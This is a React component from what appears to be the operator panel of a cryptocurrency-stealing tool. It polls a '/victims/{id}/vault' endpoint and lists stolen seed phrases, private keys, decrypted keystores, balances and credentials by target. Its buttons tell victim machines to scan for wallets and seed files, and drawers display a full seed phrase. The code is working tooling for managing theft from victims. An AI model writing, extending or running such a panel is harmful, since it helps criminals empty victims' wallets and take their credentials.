'use client';
import { useMemo, useState } from 'react';
import { ChevronDown, ChevronRight, KeyRound, Search, Sprout, Wallet } from 'lucide-react';
import { useApi } from '@/hooks/useApi';
import type { VaultResponse } from '@/lib/types';
import { ago, balanceNumber, balanceTone, dateTime, mask } from '@/lib/format';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Empty, ErrorState, SkeletonRows } from '@/components/ui/table';
import { StateChip, VaultDrawer } from '@/components/vault-drawer';
import { cn } from '@/lib/cn';

const STATES = ['', 'decrypted', 'locked', 'found', 'no_vault', 'failed'] as const;
type Mode = 'seed' | 'key' | 'wallet';

type Leaf = {
  key: string;
  walletId: string;
  secretId?: string;
  kind: string;
  preview: string;
  words: number | null;
  path: string;
  source: string | null;
  state: string;
  targetId: string;
  updatedAt: string;
  seedFile: boolean;
};

const KIND_LABEL: Record<string, string> = { seed: 'semilla', private_key: 'clave privada', keystore: 'keystore', mnemonic: 'semilla' };

export function VaultList({ victimId, onAction, disabled }: { victimId: string; onAction: (id: string) => void; disabled: boolean }) {
  const vault = useApi<VaultResponse>(`/victims/${victimId}/vault`, { pollMs: 10_000 });
  const [open, setOpen] = useState<string | null>(null);
  const [state, setState] = useState('');
  const [mode, setMode] = useState<Mode>('seed');
  const [drawer, setDrawer] = useState<string | null>(null);
  const data = vault.data;
  const groups = (data?.groups ?? []).filter((group) => !state || group.wallets.some((wallet) => wallet.state === state));

  const leaves = useMemo<Leaf[]>(() => {
    const out: Leaf[] = [];
    for (const group of groups) {
      for (const wallet of group.wallets) {
        if (state && wallet.state !== state) continue;
        const secrets = wallet.secrets.filter((secret) => mode === 'seed' ? secret.kind === 'seed' : ['private_key', 'keystore'].includes(secret.kind));
        if (mode === 'seed' && secrets.length === 0 && wallet.path && group.seedFile) {
          out.push({
            key: `${wallet.id}:file`, walletId: wallet.id, kind: 'seed_file', preview: 'fichero de semillas',
            words: null, path: wallet.path, source: wallet.source ?? null, state: wallet.state,
            targetId: group.targetId, updatedAt: wallet.lastSeenAt ?? '', seedFile: true
          });
          continue;
        }
        for (const secret of secrets) {
          out.push({
            key: `${wallet.id}:${secret.id}`, walletId: wallet.id, secretId: secret.id, kind: secret.kind,
            preview: secret.preview, words: secret.words, path: wallet.path, source: wallet.source ?? null,
            state: wallet.state, targetId: group.targetId, updatedAt: secret.updatedAt, seedFile: false
          });
        }
      }
    }
    return out.sort((a, b) => b.updatedAt.localeCompare(a.updatedAt));
  }, [groups, mode, state]);

  const counters = data?.counters;
  const wallets = (data?.groups ?? []).flatMap((group) => group.wallets);

  return (
    <div className="space-y-3">
      <div className="flex flex-wrap items-center gap-2">
        <Button size="sm" variant="secondary" disabled={disabled} onClick={() => onAction('scan')}><Wallet className="h-3 w-3" /> Escanear wallets</Button>
        <Button size="sm" variant="secondary" disabled={disabled} onClick={() => onAction('find-seeds')}><Search className="h-3 w-3" /> Buscar seeds</Button>
        <div className="ml-auto flex flex-wrap gap-1">
          {STATES.map((value) => (
            <button key={value || 'all'} className="chip" data-active={state === value} onClick={() => setState(value)}>
              {value || 'todo'} {value && data ? wallets.filter((wallet) => wallet.state === value).length : ''}
            </button>
          ))}
        </div>
      </div>

      {data ? (
        <div className="grid grid-cols-3 gap-2 sm:grid-cols-6">
          {([
            ['wallets', counters?.wallets, () => setMode('wallet')],
            ['targets', counters?.targets, () => setMode('wallet')],
            ['semillas', counters?.seeds, () => setMode('seed')],
            ['claves', counters?.keys, () => setMode('key')],
            ['con saldo', counters?.balances, () => setMode('wallet')],
            ['creds', counters?.credentials, () => setMode('wallet')]
          ] as Array<[string, number | undefined, () => void]>).map(([label, value, pick]) => (
            <button key={label} onClick={pick} className="rounded-lg border border-line bg-panel/40 px-2 py-1.5 text-left hover:bg-panel-2">
              <p className="text-2xs text-muted">{label}</p>
              <p className="num text-lg text-ink">{value ?? 0}</p>
            </button>
          ))}
        </div>
      ) : null}

      <div className="flex flex-wrap items-center gap-1 border-b border-line/60 pb-2">
        {([['seed', 'Semillas'], ['key', 'Claves privadas'], ['wallet', 'Wallets']] as Array<[Mode, string]>).map(([id, label]) => (
          <button key={id} className="chip" data-active={mode === id} onClick={() => setMode(id)}>{label}</button>
        ))}
        <span className="ml-auto text-2xs text-muted">
          Último escaneo: {data?.lastScan ? <span className="font-mono">{data.lastScan.name} · {data.lastScan.status} · {ago(data.lastScan.finishedAt ?? data.lastScan.createdAt)}</span> : '—'}
        </span>
      </div>
      {data?.lastScan?.error ? <p className="rounded border border-bad/30 bg-bad/10 p-2 text-2xs text-bad">{data.lastScan.error}</p> : null}

      {vault.loading && !data ? <SkeletonRows rows={8} cols={4} /> : vault.error && !data ? <ErrorState message={vault.error.message} retry={vault.refresh} /> : (
        <>
          {vault.stale ? <p className="text-2xs text-warn">Datos sin refrescar: {vault.error?.message ?? 'sin conexión'}. Se reintenta solo.</p> : null}
          {mode === 'wallet' ? walletGroups() : leafList()}
        </>
      )}
      <VaultDrawer walletId={drawer} onClose={() => setDrawer(null)} />
    </div>
  );

  function leafList() {
    if (leaves.length === 0) {
      return (
        <Empty
          title={mode === 'seed' ? 'Sin semillas ni ficheros de semillas' : 'Sin claves privadas'}
          hint={mode === 'seed' ? 'Buscar seeds recorre ficheros y vaults conocidos; los hallazgos aparecen aquí con su ruta y origen.' : 'Las claves hex, WIF y keystores descifrados se listan aquí.'}
          action={<Button size="sm" disabled={disabled} onClick={() => onAction(mode === 'seed' ? 'find-seeds' : 'scan')}>{mode === 'seed' ? 'Buscar seeds' : 'Escanear wallets'}</Button>}
        />
      );
    }
    return (
      <ul className="divide-y divide-line/60 rounded-lg border border-line">
        {leaves.map((leaf) => (
          <li key={leaf.key} className="flex items-center gap-2 px-3 py-2">
            <Badge tone={leaf.kind === 'seed' ? 'ok' : leaf.seedFile ? 'warn' : 'brand'}>{leaf.kind === 'seed' ? 'semilla' : KIND_LABEL[leaf.kind] ?? leaf.kind}</Badge>
            {leaf.words ? <span className="text-2xs text-muted">{leaf.words} palabras</span> : null}
            <span className="min-w-0 flex-1 truncate font-mono text-2xs text-ink" title={leaf.path}>{leaf.preview} <span className="text-muted/60">· {leaf.targetId}</span></span>
            <StateChip state={leaf.state} />
            <span className="hidden max-w-[28%] truncate font-mono text-2xs text-muted/70 sm:block" title={leaf.path}>{leaf.path}</span>
            <span className="hidden text-2xs text-muted/60 lg:block">{dateTime(leaf.updatedAt)}</span>
            <Button size="sm" variant="ghost" onClick={() => setDrawer(leaf.walletId)}>{leaf.kind === 'seed' ? 'ver semilla' : 'abrir'}</Button>
          </li>
        ))}
      </ul>
    );
  }

  function walletGroups() {
    if (groups.length === 0) {
      return (
        <Empty
          title={state ? 'Ninguna wallet en ese estado' : 'Sin wallets'}
          hint={state ? 'Cambia el filtro o lanza un escaneo nuevo.' : 'Pulsa Escanear wallets. Los resultados aparecen agrupados por target.'}
          action={!state ? <Button size="sm" disabled={disabled} onClick={() => onAction('scan')}>Escanear wallets</Button> : undefined}
        />
      );
    }
    return (
      <div className="space-y-2">
        {groups.map((item) => {
          const expanded = open === item.targetId;
          const visible = item.wallets.filter((wallet) => !state || wallet.state === state);
          if (visible.length === 0) return null;
          return (
            <section key={item.targetId} className="rounded-lg border border-line bg-panel/30">
              <button
                className="flex w-full items-center gap-2 px-3 py-2 text-left hover:bg-panel-2/60"
                aria-expanded={expanded}
                onClick={() => setOpen(expanded ? null : item.targetId)}
              >
                {expanded ? <ChevronDown className="h-3.5 w-3.5 text-muted" /> : <ChevronRight className="h-3.5 w-3.5 text-muted" />}
                <span className="font-mono text-xs text-ink">{item.label || item.targetId}</span>
                <Badge>{item.kind}</Badge>
                <StateChip state={item.state} />
                {item.address ? <span className="font-mono text-2xs text-muted">{mask(item.address, 10)}</span> : <span className="text-2xs text-muted">address —</span>}
                {item.balance ? <span className={cn('num text-2xs', balanceTone(balanceNumber(item.balance)))}>{item.balance}</span> : null}
                <span className="ml-auto text-2xs text-muted">{visible.length} perfiles · {ago(item.lastSeenAt)}</span>
              </button>
              {expanded ? (
                <div className="divide-y divide-line/60 border-t border-line/60">
                  {visible.map((wallet) => (
                    <button key={wallet.id} className="flex w-full items-center gap-2 px-3 py-1.5 text-left hover:bg-panel-2/60" onClick={() => setDrawer(wallet.id)}>
                      <span className="h-1.5 w-1.5 rounded-full bg-line" />
                      <span className="max-w-[45%] truncate font-mono text-2xs text-muted" title={wallet.path}>{wallet.path}</span>
                      <StateChip state={wallet.state} />
                      <span className="ml-auto flex items-center gap-2 text-2xs text-muted">
                        {wallet.secrets.some((secret) => secret.kind === 'seed') ? <Badge tone="ok">semilla</Badge> : null}
                        {wallet.secretCount ? <span className="text-muted"><KeyRound className="inline h-3 w-3" /> {wallet.secretCount}</span> : null}
                        {dateTime(wallet.lastSeenAt)}
                      </span>
                    </button>
                  ))}
                </div>
              ) : null}
            </section>
          );
        })}
      </div>
    );
  }
}

export function SeedGlyph() {
  return <Sprout className="h-3 w-3" />;
}
